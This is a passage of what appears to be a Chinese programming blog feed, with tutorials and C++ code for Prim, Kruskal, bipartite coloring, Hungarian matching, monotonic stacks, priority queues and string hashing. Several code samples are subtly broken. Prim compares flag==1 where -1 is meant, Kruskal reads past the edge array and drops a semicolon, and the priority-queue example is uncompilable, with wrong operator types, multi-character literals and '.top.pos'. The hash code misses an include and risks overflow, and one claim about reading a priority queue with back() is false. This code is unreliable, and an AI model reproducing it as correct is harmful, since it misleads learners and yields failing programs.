class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>,tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="type">int</span> flag=<span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 找最小点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[i]&amp;&amp;dist[i]&lt;<span class="number">1</span>&lt;&lt;<span class="number">30</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="number">1</span> || dist[i]&lt;dist[flag])</span><br><span class="line">                    flag = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tot++;</span><br><span class="line">        res+=dist[flag];</span><br><span class="line">        vis[flag]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edges[flag].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="type">int</span> v = edges[flag][i].first;</span><br><span class="line">            <span class="type">int</span> w = edges[flag][i].second;</span><br><span class="line">            dist[v] = <span class="built_in">min</span>(dist[v],w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tot!=n)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        <span class="comment">//注意是无向图</span></span><br><span class="line">        edges[a].<span class="built_in">push_back</span>(&#123;b,w&#125;);</span><br><span class="line">        edges[b].<span class="built_in">push_back</span>(&#123;a,w&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">Prim</span>();</span><br><span class="line">    <span class="keyword">if</span>(res&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;orz&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的找最小点部分，可以使用优先队列去找，会快一些，但其实没必要，因为接下来还有一个 Kruskal 算法，他能很好的代替 Prim 算法找到最小生成树。</p>
<h3 id="Kruskal-算法求最小生成树"><a href="#Kruskal-算法求最小生成树" class="headerlink" title="Kruskal 算法求最小生成树"></a>Kruskal 算法求最小生成树</h3><p>Kruskal 算法与 Prim 算法不同，他是按照边进行遍历的，一条条添加边来构成最小生成树，为了避免加入边 $(u,v)$ 的时候构成环，使用并查集来检查 $u$ 和 $v$ 是否已经加入了最小生成树中，如果已经加入了，再加这条边就会构成环，所以就不能加入。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-21.png"></p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-22.png"></p>
<p>如果需要记录路径，就要开一个边数组，记录所有生效的边。</p>
<p>到最后只剩下一个集合，算法结束。</p>
<p>如何判断是否存在最小生成树呢（是否连通），可以记录加入边的个数，如果循环结束后加入边的个数小于 $n-1$，则说明不构成图生成树的条件，图不连通。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-23.png"></p>
<p>Kruskal 的复杂度为 $O(mlogn)$，比 Prim 算法高效很多。</p>
<p>例题，还是一样</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-20.png"></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5010</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">200010</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,w;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Edge &amp;W)<span class="type">const</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> w&lt;W.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;edges[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        p[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[x]!=x) p[x]=<span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//排序所有边</span></span><br><span class="line">    <span class="built_in">sort</span>(edges,edges+m);</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a=edges[i].a;</span><br><span class="line">        <span class="type">int</span> b=edges[i].b;</span><br><span class="line">        <span class="type">int</span> w=edges[i].w;</span><br><span class="line">        a=<span class="built_in">find</span>(a); b=<span class="built_in">find</span>(b)</span><br><span class="line">        <span class="keyword">if</span>(a!=b)&#123;</span><br><span class="line">            p[a]=b;</span><br><span class="line">            res+=w;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt&lt;n<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        edges[i] = &#123;a,b,w&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">Kruskal</span>();</span><br><span class="line">    <span class="keyword">if</span>(res&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;orz&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二分图算法"><a href="#二分图算法" class="headerlink" title="二分图算法"></a>二分图算法</h2><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><p>二分图又称为二部图和偶图，是一个<strong>无向图</strong>，可以根据顶点之间的交集把顶点分为两个部分，每个部分内的顶点互不相交，至于另外那个部分的顶点相交。</p>
<p>完全二分图就是集合 $X$ 和集合 $Y$ 中每对顶点有且只有一条边的二分图，记为 $K_{n-m}$，$n$ 为 $X$ 中顶点的个数，$m$ 为 $Y$ 中顶点的个数。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-24.png"></p>
<h3 id="染色法判定二分图"><a href="#染色法判定二分图" class="headerlink" title="染色法判定二分图"></a>染色法判定二分图</h3><p>染色法就是一个边遍历边染色的二分图判定法，首先选取一个还没有被染色的节点，从他开始做 <code>dfs</code> 或者 <code>bfs</code> 遍历，先给他分配一个初始颜色，当遍历到边 $u$-&gt;$v$ 时，如果 $v$ 未被染色，就将 $v$ 染色成 $u$ 对立的那个颜色；如果 $v$ 已经被染色，则说明出现冲突，不存在二分图。</p>
<div style="text-align: center;">
    <img src="image-25.png" width="260" height="">
</div>

<p>例题</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-26.png"></p>
<p>这里需要开一个数组去记录颜色，同时要记录三种状态：未染色，颜色 A，颜色 B。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200010</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; edges[N];</span><br><span class="line"><span class="type">int</span> n,m,color[N];<span class="comment">// 0表示未染色，1,2 表示不同颜色</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> y:edges[x])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!color[y])&#123;</span><br><span class="line">            color[y] = <span class="number">3</span>-color[x];</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(y)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(color[y]==color[x])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(color,<span class="number">0</span>,<span class="built_in">sizeof</span>(color));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!color[i])&#123;</span><br><span class="line">            color[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(i)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="comment">//注意是无向图</span></span><br><span class="line">        edges[a].<span class="built_in">push_back</span>(b);</span><br><span class="line">        edges[b].<span class="built_in">push_back</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check</span>())&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="匈牙利算法解决二分图匹配问题"><a href="#匈牙利算法解决二分图匹配问题" class="headerlink" title="匈牙利算法解决二分图匹配问题"></a>匈牙利算法解决二分图匹配问题</h3><p>把二分图 $G&#x3D;&lt;V, E&gt;$ 的顶点集$V$拆分成 $V1$ 和$V2$，选取一些边 $E^′ ⊆ E$，如果 $E^′$ 中任意两条边<strong>都没有相同的顶点</strong>，则称 $E^′$ 为G的匹配。</p>
<p>而二分图的最大匹配就是<strong>边数最多的边集</strong> $E^′$。</p>
<p>如下图中的最大匹配就是红边的集合，大小为 4。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-27.png"></p>
<p>匈牙利算法就是解决二分图最大匹配问题的，他的核心思路就是遍历所有节点的边，然后匹配前看对方节点是否已经被匹配，如果没有被匹配就直接和它匹配，如果被匹配了，就看这个节点匹配的那个节点能不能换一个节点匹配，如果可以，就更换然后匹配，如果不行，就遍历下一个节点。</p>
<p>我们老师给的浅显易懂的图示</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-28.png"></p>
<p>例题</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-29.png"></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; edges[N];</span><br><span class="line"><span class="type">int</span> n,m,e;</span><br><span class="line"><span class="type">int</span> aim[N];</span><br><span class="line"><span class="type">int</span> vis[N];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> y:edges[x])&#123;</span><br><span class="line">        <span class="comment">// 如果在这一轮中没被问</span></span><br><span class="line">        <span class="keyword">if</span>(!vis[y])&#123;</span><br><span class="line">            vis[y]=<span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// 递归去询问</span></span><br><span class="line">            <span class="keyword">if</span>(aim[y]==<span class="number">0</span>||<span class="built_in">find</span>(aim[y]))&#123;</span><br><span class="line">                aim[y]=x;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">match</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(aim,<span class="number">0</span>,<span class="built_in">sizeof</span>(aim));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//记得初始化</span></span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="built_in">sizeof</span>(vis));</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">find</span>(i))&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=e;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        edges[a].<span class="built_in">push_back</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">match</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后有空会复习，补充网络流的内容。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】基础数据结构的使用</title>
    <url>/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="【算法】基础数据结构的使用"><a href="#【算法】基础数据结构的使用" class="headerlink" title="【算法】基础数据结构的使用"></a>【算法】基础数据结构的使用</h1><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p>通过维护一个单调递增或者单调递减的栈, 来求解元素左右大小边界的问题.</p>
<p>尝试思考下面这个问题, 对于第 1 个元素, 他往右边看, 除了比他高的, 都会被挡住(如第 3 个和第 4 个元素), 而这个就是单调栈的核心思想, 在这里被挡住的元素对当前节点来说是没用的信息, 所以单调栈维护的是当前节点往右边看, <strong>不会被挡住</strong>的元素.</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image.png"></p>
<p>来看一道例题</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-1.png"></p>
<p>这道例题中, 需要我们找到第一个大于当前元素的元素的下标, 那就是一个大小边界的问题, 我们直接从这个序列的最右边开始遍历, 然后为每一个节点维护一个单调栈. 即当前栈中如果存在比他小的, 就直接 pop 出去即可, 因为对于当前元素后面的元素, <strong>这些都是被挡住的元素</strong>.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">3e6</span>+<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> n, num[MAXN], ans[MAXN];</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sta;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n; i&gt;=<span class="number">1</span>; i--)&#123;</span><br><span class="line">        <span class="comment">// 如果发现当前栈内有元素比自己小</span></span><br><span class="line">        <span class="keyword">while</span>(!sta.<span class="built_in">empty</span>() &amp;&amp; num[i]&gt;num[sta.<span class="built_in">top</span>()])&#123;</span><br><span class="line">            sta.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = sta.<span class="built_in">empty</span>() ? <span class="number">0</span>:sta.<span class="built_in">top</span>();</span><br><span class="line">        sta.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="优先级队列"><a href="#优先级队列" class="headerlink" title="优先级队列"></a>优先级队列</h2><p>优先级队列(priority queue)是由二叉堆实现的, <code>push</code> 和 <code>pop</code> 的复杂度是 O(logn) ,当用优先队列去处理 <code>pair</code> 元素时, 他会按照 <code>pair</code> 中大的那个进行优先级排序, 优先级队列也是队列, 队列中如果 <code>pop</code> 了一个元素, 他不会释放分配过的内存, 只有析构的时候才会一起分配, 所以如果你 <code>pop</code> 一个元素后马上使用 <code>back</code> 去读取他还是能读到之前的元素的.</p>
<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-2.png"></p>
<p>优先队列模板题, 维护一个大端序的优先队列, 每次遇到 IN 事件就加入到队列中, 遇到 OUT 事件就从队列中取出, 如果队列为空就输出 EMPTY, 需要注意的是这里如果优先权一样, 就要选择最早来排队的病人, 所以要重构 operator, 然后把这个 operator 应用到优先队列中.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储病人信息的结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> level, pos;</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> <span class="type">int</span> x, <span class="type">const</span> <span class="type">int</span> y)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x.level != y.level)</span><br><span class="line">            <span class="keyword">return</span> x.level &lt; y.level;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> x.pos &gt; y.pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,a,b;</span><br><span class="line">    string opt;</span><br><span class="line">    <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)&#123;</span><br><span class="line">        priority_queue&lt;node&gt; que[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">            cin&gt;&gt;opt;</span><br><span class="line">            <span class="keyword">if</span>(opt == <span class="string">&#x27;IN&#x27;</span>)&#123;</span><br><span class="line">                cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">                cnt++;</span><br><span class="line">                que[a].<span class="built_in">push</span>(b)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(opt == <span class="string">&#x27;OUT&#x27;</span>)&#123;</span><br><span class="line">                cin&gt;&gt;a;</span><br><span class="line">                <span class="keyword">if</span>(que[a].<span class="built_in">empty</span>())</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;EMPTY&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    cout&lt;&lt;que[a].top.pos&lt;&lt;endl;</span><br><span class="line">                    que[a].<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>哈希表就是通过映射将字符串通过一些加密函数转换后进行存储, 可以进行<strong>状态压缩</strong>, 将大集合映射成小集合.</p>
<p>一般的哈希函数很容易发生值冲突, 这里给一个字符串哈希的模板代码:</p>
<p>根据公式:</p>
<p>$$ Hash(S) &#x3D; (\sum_{i&#x3D;1}^nc_i * base^n-1) \mod p $$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1222827239</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哈希状态压缩例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-3.png"></p>
<p>需要注意的是, 这道题的范围 $N \leq 10000, M_{max} \leq 1500$, 如果使用 <code>vector</code> 存储数据, 需要花费的最大空间计算如下:</p>
<p>$$ \frac{10000 \times 1500}{1 \times 1024 \times 1024} \approx 15 \text{ MB} $$</p>
<p>这里的 $1$ 是因为对于每个字符是 char 格式, 占一个字节. 最大需要消耗 15mb 的内存空间, 所以会爆掉, 这里要用哈希去状态压缩, 然后使用 <code>set</code> 去重, 最后返回 <code>size</code> 就是答案, 代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1222827239</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        string str;</span><br><span class="line">        cin&gt;&gt;str;</span><br><span class="line">        res.<span class="built_in">insert</span>(<span class="built_in">getHash</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res.<span class="built_in">size</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重哈希状态压缩, 例题:</p>
